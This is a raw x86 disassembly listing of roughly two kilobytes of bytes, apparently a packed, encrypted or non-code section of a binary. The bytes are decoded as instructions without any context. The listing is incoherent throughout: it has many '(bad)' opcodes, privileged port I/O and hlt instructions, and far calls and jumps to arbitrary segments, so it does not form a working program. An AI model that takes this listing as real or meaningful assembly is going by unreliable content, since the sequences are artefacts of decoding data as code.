  42a6d0:	sbb    ebp,DWORD PTR ds:[ebx-0x6c33baae]
  42a6d7:	out    0x5f,eax
  42a6d9:	mov    ds:0x791ef97f,eax
  42a6de:	aam    0xc1
  42a6e0:	sub    edi,DWORD PTR [esi]
  42a6e2:	cli    
  42a6e3:	dec    ebp
  42a6e4:	rol    BYTE PTR [esi-0x26],cl
  42a6e7:	ja     0x42a6ac
  42a6e9:	pop    ebx
  42a6ea:	outs   dx,BYTE PTR ds:[esi]
  42a6eb:	out    0xa6,eax
  42a6ed:	mov    eax,ds:0x6ac0f89b
  42a6f2:	mov    WORD PTR [ebp+0x1b],gs
  42a6f5:	mov    DWORD PTR [ebx],eax
  42a6f7:	fadd   QWORD PTR [ebx+0x0]
  42a6fa:	sahf   
  42a6fb:	call   0x34b9:0xa87ba178
  42a702:	or     eax,0x27c34992
  42a707:	sub    al,0x3e
  42a709:	jge    0x42a6d5
  42a70b:	and    esp,DWORD PTR fs:[edx-0x7b0401bf]
  42a712:	mov    esp,0xa1c6b446
  42a717:	sub    eax,0xd2b2709a
  42a71c:	sbb    BYTE PTR [ecx+0x58],ch
  42a71f:	push   0x4c6548ff
  42a724:	sahf   
  42a725:	jns    0x42a723
  42a727:	push   es
  42a728:	mov    cl,0x2d
  42a72a:	mov    edi,0xb7043921
  42a72f:	sahf   
  42a730:	and    bl,BYTE PTR [ecx+0x73]
  42a733:	mov    dl,0x41
  42a735:	fucom  st(0)
  42a737:	fwait
  42a738:	push   edx
  42a739:	call   0x29b2:0x6b0247b
  42a740:	add    eax,0x5fd8a842
  42a745:	aam    0xdf
  42a747:	sbb    BYTE PTR fs:[eax-0x9a7edd7],dh
  42a74e:	icebp  
  42a74f:	imul   ecx,DWORD PTR [ebp-0x5d],0x1b
  42a753:	mov    eax,ds:0x7d89937c
  42a758:	mov    al,0x60
  42a75a:	sub    bh,cl
  42a75c:	mov    ds:0x9704b636,eax
  42a761:	mov    DWORD PTR [edx+0x1],ebx
  42a764:	test   DWORD PTR [eax+0xea7e5ee],esi
  42a76a:	in     al,dx
  42a76b:	pusha  
  42a76c:	and    ebx,DWORD PTR [ecx-0x2e]
  42a76f:	popf   
  42a770:	bound  ebp,QWORD PTR [esi-0x20]
  42a773:	sahf   
  42a774:	sub    eax,ebx
  42a776:	jmp    0x42a78a
  42a778:	mov    DWORD PTR ds:0x2d329fa9,ebp
  42a77e:	mov    ebx,0xb09da9
  42a783:	hlt    
  42a784:	pop    es
  42a785:	or     al,0x1d
  42a787:	push   eax
  42a788:	mov    ch,0x7e
  42a78a:	cmp    eax,0x3b515aec
  42a78f:	iret   
  42a790:	sbb    BYTE PTR [edi],dh
  42a792:	cmp    esi,DWORD PTR [esi+0x64baa97f]
  42a798:	and    ecx,DWORD PTR [edx-0x62]
  42a79b:	sub    al,0x95
  42a79d:	aas    
  42a79e:	mov    al,dh
  42a7a0:	cli    
  42a7a1:	stos   BYTE PTR es:[edi],al
  42a7a2:	test   ch,dl
  42a7a4:	push   ds
  42a7a5:	cmp    DWORD PTR [ebp-0xf],eax
  42a7a8:	cmp    BYTE PTR [eax+0x59],ch
  42a7ab:	ins    DWORD PTR es:[edi],dx
  42a7ac:	cdq    
  42a7ad:	mov    ds:0xaa259b29,al
  42a7b2:	inc    ecx
  42a7b3:	repnz push ebx
  42a7b5:	mov    ?,eax
  42a7b7:	inc    eax
  42a7b8:	and    ebp,DWORD PTR [ecx]
  42a7ba:	(bad)  
  42a7bb:	fistp  DWORD PTR [edi-0x66cf1c43]
  42a7c1:	xchg   ebp,eax
  42a7c2:	(bad)  
  42a7c4:	inc    eax
  42a7c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7c6:	inc    ebx
  42a7c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7c8:	les    ecx,FWORD PTR [edi+0x691b4bbf]
  42a7ce:	push   ss
  42a7cf:	push   esi
  42a7d0:	mov    edi,edx
  42a7d2:	fs and BYTE PTR cs:[edi-0x56d776b4],cl
  42a7da:	mov    esi,0xd59ffc67
  42a7df:	rcl    BYTE PTR [ecx+0x1e],0xbd
  42a7e3:	fcomp  QWORD PTR [ebx]
  42a7e5:	sbb    DWORD PTR [esi-0x28],edx
  42a7e8:	popa   
  42a7e9:	rol    DWORD PTR [ebx],1
  42a7eb:	shl    BYTE PTR [esi],1
  42a7ed:	pushf  
  42a7ee:	stos   DWORD PTR es:[edi],eax
  42a7ef:	stos   DWORD PTR es:[edi],eax
  42a7f0:	xor    DWORD PTR [edx-0x77],edi
  42a7f3:	adc    BYTE PTR [ecx],dh
  42a7f5:	cmp    ecx,ebp
  42a7f7:	pusha  
  42a7f8:	sti    
  42a7f9:	ret    
  42a7fa:	in     al,dx
  42a7fb:	xor    al,0xe8
  42a7fd:	pop    ds
  42a7fe:	sub    BYTE PTR [edi+0x618ba423],ch
  42a804:	mov    ?,WORD PTR [ebp+0x5323d2e3]
  42a80a:	push   esi
  42a80b:	xor    eax,0xa384bf92
  42a811:	fwait
  42a812:	jge    0x42a7b2
  42a814:	js     0x42a7fd
  42a816:	pusha  
  42a817:	rol    ebp,1
  42a819:	shl    BYTE PTR [ebx-0x5b370718],cl
  42a81f:	jbe    0x42a817
  42a821:	xor    esi,DWORD PTR [esp+edx*2+0x5d74fb]
  42a828:	inc    esi
  42a829:	cmp    ecx,DWORD PTR [ebx+0x3]
  42a82c:	in     eax,dx
  42a82d:	adc    cl,BYTE PTR [ebx]
  42a82f:	setb   bl
  42a832:	mov    dh,0x6c
  42a834:	and    BYTE PTR [ecx-0x317e6b6d],bh
  42a83a:	out    0xf8,eax
  42a83c:	rcr    BYTE PTR [edx-0x256186c5],0xd
  42a843:	aad    0xd4
  42a845:	pop    ss
  42a846:	dec    edi
  42a847:	mov    gs,WORD PTR [edx-0x2f3b44c9]
  42a84d:	in     eax,dx
  42a84e:	cmp    DWORD PTR [eax],ebx
  42a850:	mov    ch,0x4d
  42a852:	and    al,0xe9
  42a854:	xlat   BYTE PTR ds:[ebx]
  42a855:	add    DWORD PTR [edi],ebx
  42a857:	and    BYTE PTR [esi],dl
  42a859:	fldenv [esp+ebx*8-0x3d7acf81]
  42a860:	lds    ecx,FWORD PTR [ecx-0x30e12f94]
  42a866:	(bad)  [ecx]
  42a868:	dec    ebp
  42a869:	sbb    eax,0xe97028b5
  42a86e:	jge    0x42a80e
  42a870:	data16 ror BYTE PTR [eax-0x4c084157],0xac
  42a878:	test   DWORD PTR [esi+0x3d],ebx
  42a87b:	and    eax,0x49f3e0bf
  42a880:	clc    
  42a881:	or     al,0x64
  42a883:	push   es
  42a884:	arpl   WORD PTR [ecx-0x46050dae],bp
  42a88a:	and    BYTE PTR [eax],al
  42a88c:	ficomp DWORD PTR [ecx-0x784ae6bf]
  42a892:	xchg   DWORD PTR ds:0xb7a1f459,ebx
  42a898:	cld    
  42a899:	mov    ds:0xbf1504b6,eax
  42a89e:	sahf   
  42a89f:	jge    0x42a867
  42a8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8a2:	pushf  
  42a8a3:	xchg   ebp,eax
  42a8a4:	(bad)  [eax-0x1e]
  42a8a7:	in     eax,0xc9
  42a8a9:	icebp  
  42a8aa:	mov    eax,DWORD PTR [edx]
  42a8ac:	push   es
  42a8ad:	rcr    BYTE PTR [edi-0x33],0x1d
  42a8b1:	outs   dx,BYTE PTR ds:[esi]
  42a8b2:	outs   dx,BYTE PTR ds:[esi]
  42a8b3:	jmp    0x42a8d3
  42a8b5:	jmp    0x6f64c8fb
  42a8ba:	mov    BYTE PTR [esi],bl
  42a8bc:	js     0x42a85f
  42a8be:	loopne 0x42a85d
  42a8c0:	shl    BYTE PTR [edi-0x368f1165],0x49
  42a8c7:	test   eax,0x40cf6c0b
  42a8cc:	fmul   DWORD PTR [edx+0x5346c684]
  42a8d2:	call   0xd661:0xdadd14d4
  42a8d9:	shl    DWORD PTR [eax-0x429f9c88],0xea
  42a8e0:	xor    al,0x88
  42a8e2:	jnp    0x42a91d
  42a8e4:	not    DWORD PTR [esi+0x29580cb6]
  42a8ea:	test   BYTE PTR [edx+ecx*1+0x7c],cl
  42a8ee:	mov    al,0x44
  42a8f0:	call   0xe6ca270a
  42a8f5:	inc    ecx
  42a8f6:	or     al,BYTE PTR [ebx+ecx*4]
  42a8f9:	mov    ecx,0xf4c748e1
  42a8fe:	pop    ss
  42a8ff:	out    0xd9,eax
  42a901:	cmp    BYTE PTR [edi-0x6a6c167c],0x6b
  42a908:	adc    eax,0x9efda51
  42a90d:	pop    edi
  42a90e:	mov    cs,WORD PTR [ebx]
  42a910:	and    edi,ecx
  42a912:	js     0x42a8bc
  42a914:	enter  0x4dab,0x63
  42a918:	add    eax,0x529c99b
  42a91d:	or     DWORD PTR [eax+ebp*8-0x6d],ebp
  42a921:	ret    
  42a922:	inc    ebx
  42a923:	jb     0x42a940
  42a925:	mov    ecx,0xa3be0fa5
  42a92a:	jl     0x42a999
  42a92c:	(bad)  
  42a92d:	mov    ds:0xb5780a3b,al
  42a932:	add    DWORD PTR [edi+0x76403551],ebx
  42a938:	lds    ebx,FWORD PTR [ebp+edi*4-0xb3b8fac]
  42a93f:	dec    edx
  42a940:	out    0x5e,eax
  42a942:	addr16 push cs
  42a944:	cmc    
  42a945:	and    BYTE PTR ds:0x40bf08e7,0x13
  42a94c:	jns    0x42a945
  42a94e:	mov    edx,0x1ed91d4
  42a953:	popa   
  42a954:	xlat   BYTE PTR ds:[ebx]
  42a955:	xlat   BYTE PTR ds:[ebx]
  42a956:	loop   0x42a924
  42a958:	push   cs
  42a959:	cwde   
  42a95a:	push   esp
  42a95b:	add    eax,0x7ea89518
  42a960:	sbb    al,0xb9
  42a962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a963:	jne    0x42a9a6
  42a965:	mov    ebx,0xa4452852
  42a96a:	imul   edi,DWORD PTR [eax+ecx*8+0x36],0x23
  42a96f:	push   esp
  42a970:	es nop
  42a972:	inc    edx
  42a973:	and    ebx,DWORD PTR [esi+0x4bc4ee11]
  42a979:	and    eax,0x6224c9e7
  42a97e:	lock int 0x23
  42a981:	pop    ecx
  42a982:	sub    DWORD PTR [edx],0x313523ac
  42a988:	add    al,0xea
  42a98a:	pop    edi
  42a98b:	cmc    
  42a98c:	lods   al,BYTE PTR ds:[esi]
  42a98d:	jne    0x42a942
  42a98f:	dec    eax
  42a990:	xchg   ecx,eax
  42a991:	(bad)
  42a994:	pop    ebp
  42a995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a996:	xor    edx,ebp
  42a998:	inc    ebp
  42a999:	repz fdivp st(1),st
  42a99c:	adc    bh,BYTE PTR [ebx-0x297ccabd]
  42a9a2:	jnp    0x42a9ca
  42a9a4:	nop
  42a9a5:	dec    ecx
  42a9a6:	push   es
  42a9a7:	mov    esp,0x57261bd3
  42a9ac:	mov    cl,0x1
  42a9ae:	mov    ch,0xf8
  42a9b0:	stc    
  42a9b1:	xchg   ebx,eax
  42a9b2:	mov    eax,0xba22bfcc
  42a9b7:	cld    
  42a9b8:	(bad)  
  42a9b9:	push   cs
  42a9ba:	add    ah,cl
  42a9bc:	or     bl,dh
  42a9be:	mov    al,0x34
  42a9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9c1:	cld    
  42a9c2:	ret    
  42a9c3:	xchg   ebp,eax
  42a9c4:	aad    0xb3
  42a9c6:	adc    edi,esp
  42a9c8:	xor    DWORD PTR [eax-0x57],eax
  42a9cb:	imul   edx,DWORD PTR [eax-0x17566b7],0xffffffc6
  42a9d2:	add    ebx,DWORD PTR [ecx-0x7b4a5b81]
  42a9d8:	add    eax,0xa4ec9912
  42a9dd:	dec    edx
  42a9de:	ds aam 0xa
  42a9e1:	cli    
  42a9e2:	sub    ch,BYTE PTR [ecx]
  42a9e4:	outs   dx,BYTE PTR ds:[esi]
  42a9e5:	jge    0x42a9a1
  42a9e7:	dec    ecx
  42a9e8:	mov    al,BYTE PTR [eax]
  42a9ea:	push   edx
  42a9eb:	scas   eax,DWORD PTR es:[edi]
  42a9ec:	jbe    0x42a9a1
  42a9ee:	mov    ch,0x41
  42a9f0:	int    0xa3
  42a9f2:	pop    es
  42a9f3:	jbe    0x42aa39
  42a9f5:	ins    DWORD PTR es:[edi],dx
  42a9f6:	popf   
  42a9f7:	not    bl
  42a9f9:	xchg   esp,eax
  42a9fa:	sub    eax,0xb11bc273
  42a9ff:	aam    0x4f
  42aa01:	dec    ebx
  42aa02:	mov    bl,0x35
  42aa04:	mov    ch,0x9f
  42aa06:	enter  0xd2ec,0xc2
  42aa0a:	xor    ebp,DWORD PTR [ebp+0x24]
  42aa0d:	leave  
  42aa0e:	test   DWORD PTR [eax],eax
  42aa10:	and    bl,BYTE PTR [ebx-0x14]
  42aa13:	pop    ds
  42aa14:	fs push cs
  42aa16:	ins    BYTE PTR es:[edi],dx
  42aa17:	push   0xa95fc969
  42aa1c:	cwde   
  42aa1d:	pusha  
  42aa1e:	xchg   edi,eax
  42aa1f:	out    dx,eax
  42aa20:	sbb    eax,0xe0d04909
  42aa25:	shl    BYTE PTR [ebx],0x15
  42aa28:	aas    
  42aa29:	mov    eax,0x24d34ceb
  42aa2e:	popf   
  42aa2f:	imul   edi,DWORD PTR [eax],0xffffffa2
  42aa32:	sub    eax,0x54f080a4
  42aa37:	rcr    BYTE PTR [esi],0xe9
  42aa3a:	sub    ah,0x94
  42aa3d:	not    DWORD PTR [ecx+0x50]
  42aa40:	gs mov ah,bl
  42aa43:	pop    edx
  42aa44:	cmp    DWORD PTR ds:0xa158ec2f,ebx
  42aa4a:	sub    DWORD PTR [edi+0x5d],esp
  42aa4d:	fld    st(6)
  42aa4f:	inc    ebx
  42aa50:	dec    edi
  42aa51:	or     esp,edi
  42aa53:	jmp    0x42aa68
  42aa55:	retf   
  42aa56:	lds    edi,FWORD PTR [ebp+0x662048d5]
  42aa5c:	jne    0x42aad5
  42aa5e:	cmp    al,ch
  42aa60:	jns    0x42aa17
  42aa62:	xchg   ebp,eax
  42aa63:	mov    bh,0x1
  42aa65:	cmp    al,ah
  42aa67:	inc    esp
  42aa68:	in     eax,0xd7
  42aa6a:	leave  
  42aa6b:	jbe    0x42aa4d
  42aa6d:	sub    BYTE PTR [edi],ah
  42aa6f:	and    BYTE PTR [ecx],0xa2
  42aa72:	stos   DWORD PTR es:[edi],eax
  42aa73:	xor    DWORD PTR [ebx],edi
  42aa75:	cmp    al,0xe1
  42aa77:	in     eax,0xb2
  42aa79:	aas    
  42aa7a:	mov    ds:0xb98e9c0e,eax
  42aa7f:	les    ebp,FWORD PTR [esi-0x13]
  42aa82:	mov    eax,ds:0xb31775c0
  42aa87:	out    dx,eax
  42aa88:	(bad)  
  42aa89:	push   esp
  42aa8a:	jmp    0x89:0x11b91b9a
  42aa91:	fxch   st(0)
  42aa93:	push   0x4f
  42aa95:	hlt    
  42aa96:	retf   
  42aa97:	retf   
  42aa98:	inc    eax
  42aa99:	cmp    BYTE PTR [ecx],ah
  42aa9b:	(bad)  
  42aa9c:	aad    0x95
  42aa9e:	mov    ch,ch
  42aaa0:	or     edi,DWORD PTR [ebx]
  42aaa2:	inc    esp
  42aaa3:	je     0x42aae1
  42aaa5:	aas    
  42aaa6:	mov    dh,0xe4
  42aaa8:	pushf  
  42aaa9:	loope  0x42aae5
  42aaab:	popa   
  42aaac:	cmc    
  42aaad:	inc    edx
  42aaae:	in     eax,dx
  42aaaf:	repz lea edx,[eax+edi*2+0x15]
  42aab4:	pop    ds
  42aab5:	mov    ecx,0x5bc2f00d
  42aaba:	xor    ebx,DWORD PTR [ecx+0x22]
  42aabd:	cmp    esi,DWORD PTR cs:[ebp-0x3dc45b2a]
  42aac4:	ret    
  42aac5:	jo     0x42ab28
  42aac7:	cmp    ecx,DWORD PTR [eax-0x12]
  42aaca:	jmp    0x42aa6e
  42aacc:	xor    eax,0x9bd6287d
  42aad1:	and    bh,BYTE PTR [ecx+0x15]
  42aad4:	fnstcw WORD PTR [esi+0x12]
  42aad7:	jno    0x42aaa3
  42aad9:	jno    0x42aab7
  42aadb:	les    esp,FWORD PTR [ebx]
  42aadd:	pcmpeqd mm3,QWORD PTR [ebx+0x18e2f91e]
  42aae4:	push   ebx
  42aae5:	jl     0x42aaed
  42aae7:	aas    
  42aae8:	in     eax,dx
  42aae9:	fwait
  42aaea:	or     esp,ecx
  42aaec:	jns    0x42aabd
  42aaee:	data16 jl 0x42aa91
  42aaf1:	ror    DWORD PTR [ecx],cl
  42aaf3:	push   edi
  42aaf4:	and    dl,dh
  42aaf6:	mov    ch,0x4
  42aaf8:	cmp    ebx,DWORD PTR [ebp+0x38]
  42aafb:	cdq    
  42aafc:	inc    edi
  42aafd:	or     edx,DWORD PTR [edx]
  42aaff:	cs pop fs
  42ab02:	dec    ebx
  42ab03:	sub    eax,DWORD PTR [edi]
  42ab05:	inc    edi
  42ab06:	sahf   
  42ab07:	or     BYTE PTR [eax+0x5b],dh
  42ab0a:	dec    ebx
  42ab0b:	(bad)
  42ab0e:	mov    ah,0xf3
  42ab10:	and    BYTE PTR [eax+0x2b34ee1],ch
  42ab16:	sti    
  42ab17:	ret    
  42ab18:	mov    ch,0x63
  42ab1a:	cmc    
  42ab1b:	out    0x6c,eax
  42ab1d:	enter  0xfdb1,0x25
  42ab21:	sub    edx,ebp
  42ab23:	test   eax,0xae3bbb49
  42ab28:	xchg   ebx,eax
  42ab29:	and    ebx,ecx
  42ab2b:	ror    esp,0xf4
  42ab2e:	dec    ebx
  42ab2f:	icebp  
  42ab30:	push   ecx
  42ab31:	or     ah,BYTE PTR [eax]
  42ab33:	shl    DWORD PTR [ecx+esi*8],0xa
  42ab37:	aad    0x55
  42ab39:	fwait
  42ab3a:	mov    edx,DWORD PTR [ebp+0x0]
  42ab3d:	cmp    edi,DWORD PTR [esp+eax*1]
  42ab40:	cwde   
  42ab41:	dec    edi
  42ab42:	cmp    eax,0xe14d41f7
  42ab47:	and    al,0x6e
  42ab49:	mov    ebp,ecx
  42ab4b:	mov    ds:0x4cb894e9,al
  42ab50:	scas   eax,DWORD PTR es:[edi]
  42ab51:	aaa    
  42ab52:	or     eax,0xbe7d48d8
  42ab57:	or     al,0x19
  42ab59:	dec    ecx
  42ab5a:	(bad)  
  42ab5b:	jge    0x42ab48
  42ab5d:	(bad)  
  42ab5e:	sub    ecx,DWORD PTR [edi+esi*4-0x7b]
  42ab62:	mov    edi,0x78d4aaac
  42ab67:	ror    BYTE PTR [ebx-0x6ad16838],cl
  42ab6d:	jbe    0x42ab09
  42ab6f:	push   ss
  42ab70:	and    dh,BYTE PTR [edx]
  42ab72:	mov    edx,0xbe862070
  42ab77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab78:	mov    al,0xa0
  42ab7a:	lock xor dh,0xed
  42ab7e:	push   es
  42ab7f:	iret   
  42ab80:	into   
  42ab81:	stc    
  42ab82:	push   ebx
  42ab83:	leave  
  42ab84:	dec    ebp
  42ab85:	mov    ds:0xa5eef2a5,eax
  42ab8a:	mov    esi,ebp
  42ab8c:	dec    eax
  42ab8d:	mov    al,ds:0xd444a5b2
  42ab92:	add    esp,DWORD PTR [ebx-0x6c]
  42ab95:	loopne 0x42ab4b
  42ab97:	repnz add al,BYTE PTR fs:[edi-0x5954aac5]
  42ab9f:	lock leave 
  42aba1:	inc    esi
  42aba2:	pop    ecx
  42aba3:	xor    ebx,esi
  42aba5:	jp     0x42abbf
  42aba7:	fstp   DWORD PTR [ecx]
  42aba9:	aad    0x92
  42abab:	out    dx,eax
  42abac:	je     0x42ab76
  42abae:	test   al,0xac
  42abb0:	inc    ebp
  42abb1:	mov    esi,es
  42abb3:	in     eax,0x75
  42abb5:	pusha  
  42abb6:	or     al,0x6b
  42abb8:	test   DWORD PTR [eax+0x2a6311ef],ebx
  42abbe:	and    eax,DWORD PTR [ebp+0x528dd1e]
  42abc4:	or     al,0xa2
  42abc6:	retf   
  42abc7:	in     al,0x50
  42abc9:	jmp    0x3634ecfd
  42abce:	cmp    al,0x91
  42abd0:	or     DWORD PTR [ebx+0x6edb25a6],esi
  42abd6:	stos   BYTE PTR es:[edi],al
  42abd7:	hlt    
  42abd8:	mov    ds:0xb5c3a18c,eax
  42abdd:	call   0xf18b:0xd687684b
  42abe4:	sub    DWORD PTR [ebx-0x3560b0b3],ecx
  42abea:	mov    ebp,ebp
  42abec:	mov    esp,0x618978d1
  42abf1:	push   esp
  42abf2:	xor    bh,BYTE PTR [esi]
  42abf4:	sbb    edi,ecx
  42abf6:	jb     0x42ac3c
  42abf8:	mov    eax,0xabeae9e8
  42abfd:	mov    ds:0x8401902b,eax
  42ac02:	and    al,0xc3
  42ac04:	cmp    BYTE PTR [eax-0x4a],bl
  42ac07:	cld    
  42ac08:	inc    edx
  42ac09:	and    DWORD PTR [eiz*8+0x47419efc],esp
  42ac10:	mov    eax,0x66c31ca5
  42ac15:	dec    ebx
  42ac16:	sbb    eax,0x2b7b21c7
  42ac1b:	cmp    edx,esi
  42ac1d:	pop    es
  42ac1e:	pushf  
  42ac1f:	cli    
  42ac20:	and    BYTE PTR [ecx-0x32],bl
  42ac23:	fwait
  42ac24:	fwait
  42ac25:	and    BYTE PTR [edi+0x74a483e1],al
  42ac2b:	push   ecx
  42ac2c:	adc    eax,0xc7ed0ac0
  42ac31:	test   bl,0xd6
  42ac34:	add    eax,0xe5c4405d
  42ac39:	neg    DWORD PTR [ebp-0x754c11b]
  42ac3f:	data16 gs mov bl,0xdc
  42ac43:	in     eax,dx
  42ac44:	fdiv   st(0),st
  42ac46:	adc    cl,dh
  42ac48:	sbb    ecx,DWORD PTR [edx+eiz*8+0x523f4ddf]
  42ac4f:	lock push ebp
  42ac51:	mov    edi,0x1d90edb8
  42ac56:	xchg   edx,eax
  42ac57:	rcr    DWORD PTR [edx],cl
  42ac59:	sbb    DWORD PTR [edi],ecx
  42ac5b:	mov    cl,0x31
  42ac5d:	ror    BYTE PTR [ebp+0x7bb89b24],cl
  42ac63:	es xor bl,dl
  42ac66:	scas   al,BYTE PTR es:[edi]
  42ac67:	std    
  42ac68:	leave  
  42ac69:	jecxz  0x42ac84
  42ac6b:	(bad)  
  42ac6c:	sbb    BYTE PTR [ecx],bh
  42ac6e:	mov    bl,0xad
  42ac70:	adc    ecx,DWORD PTR [edx-0x65c12e6a]
  42ac76:	cmp    edi,eax
  42ac78:	js     0x42aceb
  42ac7a:	ror    eax,1
  42ac7c:	lds    ebx,FWORD PTR [edi]
  42ac7e:	jo     0x42ac24
  42ac80:	outs   dx,BYTE PTR ds:[esi]
  42ac81:	push   0xffffffb0
  42ac83:	and    al,0x5d
  42ac85:	ja     0x42ac14
  42ac87:	xchg   edx,eax
  42ac88:	gs ret 
  42ac8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac8b:	lock int 0xff
  42ac8e:	addr16 xchg edi,eax
  42ac90:	push   ss
  42ac91:	dec    ecx
  42ac92:	push   eax
  42ac93:	out    dx,al
  42ac94:	xchg   ah,ch
  42ac96:	shl    BYTE PTR [edi],cl
  42ac98:	pop    es
  42ac99:	call   0xa04c:0x8059c23b
  42aca0:	sub    al,0x59
  42aca2:	pop    esi
  42aca3:	or     DWORD PTR [esi-0x3db4865],eax
  42aca9:	jnp    0x42ace1
  42acab:	retf   0x3217
  42acae:	push   ebp
  42acaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42acb0:	inc    ebx
  42acb1:	mov    al,ds:0x92f0bb73
  42acb6:	dec    ecx
  42acb7:	dec    ebp
  42acb8:	sbb    cl,ch
  42acba:	cld    
  42acbb:	cwde   
  42acbc:	mov    dl,0x93
  42acbe:	dec    ebx
  42acbf:	push   eax
  42acc0:	cdq    
  42acc1:	or     DWORD PTR [edx+edx*2-0x6f8ecfbb],ecx
  42acc8:	sti    
  42acc9:	scas   eax,DWORD PTR es:[edi]
  42acca:	test   eax,0xd50921f0
  42accf:	jno    0x42ac57
  42acd1:	std    
  42acd2:	push   ds
  42acd3:	out    0xff,al
  42acd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42acd6:	fistp  DWORD PTR [esi-0x33869655]
  42acdc:	iret   
  42acdd:	into   
  42acde:	xchg   esi,eax
  42acdf:	or     eax,0xb4bc582c
  42ace4:	jl     0x42ad22
  42ace6:	mov    dl,0x17
  42ace8:	xchg   esi,eax
  42ace9:	xchg   DWORD PTR [ebx+0x58],ebx
  42acec:	xor    BYTE PTR [ebp-0x1f39a06e],0x9a
  42acf3:	out    dx,al
  42acf4:	and    eax,0xd01acbb9
  42acf9:	jb     0x42ace0
  42acfb:	stc    
  42acfc:	imul   ebx,DWORD PTR [ebp-0x796647b5],0x5a64ffa8
  42ad06:	push   ss
  42ad07:	or     eax,0xc4b2afe5
  42ad0c:	cdq    
  42ad0d:	cmp    eax,esi
  42ad0f:	loop   0x42ad69
  42ad11:	ins    DWORD PTR es:[edi],dx
  42ad12:	fldcw  WORD PTR [ecx+0x472ba2b8]
  42ad18:	fbstp  TBYTE PTR [ecx]
  42ad1a:	dec    edx
  42ad1b:	in     al,0xbd
  42ad1d:	dec    ecx
  42ad1e:	loope  0x42ad6a
  42ad20:	mov    ds:0x2d1ec787,eax
  42ad25:	mov    DWORD PTR [edx],ebp
  42ad27:	out    0x3c,al
  42ad29:	inc    esi
  42ad2a:	mov    ecx,0xa3793df8
  42ad2f:	call   0x72dfb64e
  42ad34:	mov    bh,bl
  42ad36:	and    al,0x3a
  42ad38:	jge    0x42ace2
  42ad3a:	retf   
  42ad3b:	add    al,0x7a
  42ad3d:	and    eax,0x5b46e954
  42ad42:	outs   dx,BYTE PTR ds:[esi]
  42ad43:	rcr    DWORD PTR [esi-0x6d],1
  42ad46:	test   DWORD PTR [esi],edx
  42ad48:	frstor [edx-0x44]
  42ad4b:	clc    
  42ad4c:	xchg   esi,eax
  42ad4d:	mov    dh,0x3b
  42ad4f:	not    DWORD PTR [ebx+0x6963a18b]
  42ad55:	sbb    al,0x78
  42ad57:	es sbb al,0xf9
  42ad5a:	aaa    
  42ad5b:	mov    esp,ss
  42ad5d:	gs xor al,0x25
  42ad60:	jp     0x42ad06
  42ad62:	stos   DWORD PTR es:[edi],eax
  42ad63:	mov    al,ds:0x61c8a661
  42ad68:	jo     0x42adb0
  42ad6a:	lods   eax,DWORD PTR ds:[esi]
  42ad6b:	add    al,0x6e
  42ad6d:	ficomp WORD PTR [esi+esi*4+0x4e9651d]
  42ad74:	cmc    
  42ad75:	and    cl,dl
  42ad77:	add    ebx,DWORD PTR [esi]
  42ad79:	inc    edx
  42ad7a:	mov    esp,0x43bedb58
  42ad7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad80:	jnp    0x42ad57
  42ad82:	retf   0x8374
  42ad85:	xor    al,0xa
  42ad87:	mov    al,ds:0xe9e2d917
  42ad8c:	int    0x5c
  42ad8e:	inc    DWORD PTR [edx+0x72]
  42ad91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad92:	or     ebp,DWORD PTR [edx-0x4a]
  42ad95:	iret   
  42ad96:	push   es
  42ad97:	xchg   edi,esp
  42ad99:	mov    eax,ds:0xb1763cab
  42ad9e:	enter  0xf24,0x18
  42ada2:	out    dx,eax
  42ada3:	inc    esp
  42ada4:	and    dh,cl
  42ada6:	cmp    ecx,DWORD PTR [ecx+0x40]
  42ada9:	ins    BYTE PTR es:[edi],dx
  42adaa:	pop    ebp
  42adab:	outs   dx,BYTE PTR ds:[esi]
  42adac:	shr    ebp,cl
  42adae:	mov    edi,0xec78656a
  42adb3:	out    dx,eax
  42adb4:	pop    esi
  42adb5:	jmp    0xe0b2:0xd95cb32b
  42adbc:	mov    ?,WORD PTR ds:0x2b2af1db
  42adc2:	mov    ch,0x9c
  42adc4:	lds    esi,FWORD PTR [ebp+eax*2-0xd]
  42adc8:	je     0x42adc8
  42adca:	fld    DWORD PTR [edx+eiz*1]
  42adcd:	sub    DWORD PTR [ecx],ebx
  42adcf:	sub    ebx,esi
  42add1:	mov    cl,0xc7
  42add3:	mov    WORD PTR [eax+0x5d593778],ss
  42add9:	cmp    bh,BYTE PTR [edi-0x6179a8c7]
  42addf:	cmp    al,0x1d
  42ade1:	leave  
  42ade2:	imul   edi,DWORD PTR ds:0xff5e83a8,0xffffffc6
  42ade9:	aaa    
  42adea:	or     edi,DWORD PTR [edx+0xf]
  42aded:	and    al,BYTE PTR [edx]
  42adef:	mov    ecx,0x192aa49d
  42adf4:	push   esp
  42adf5:	call   0x94b6:0xc320431f
  42adfc:	ss dec edx
  42adfe:	inc    ebx
  42adff:	fadd   DWORD PTR [ebp+0x45]
  42ae02:	cwde   
  42ae03:	icebp  
  42ae04:	mov    ch,0xbb
  42ae06:	dec    ebx
  42ae07:	push   ds
  42ae08:	fcomp  DWORD PTR [eax+edi*2-0x40a76160]
  42ae0f:	pop    edi
  42ae10:	and    al,0x98
  42ae12:	sub    cl,BYTE PTR [ecx-0x60]
  42ae15:	pop    ds
  42ae16:	ins    DWORD PTR es:[edi],dx
  42ae17:	dec    esp
  42ae18:	popa   
  42ae19:	enter  0x3e14,0x1b
  42ae1d:	imul   esi,DWORD PTR [edi+0x1995d842],0xac7faf75
  42ae27:	pop    esp
  42ae28:	mov    DWORD PTR [ecx],ebp
  42ae2a:	or     al,0x9
  42ae2c:	aad    0xf1
  42ae2e:	mov    bl,0xd8
  42ae30:	cmp    DWORD PTR [edx+0x491968aa],ebp
  42ae36:	adc    al,0xe5
  42ae38:	add    edx,ebp
  42ae3a:	shr    DWORD PTR [edx],1
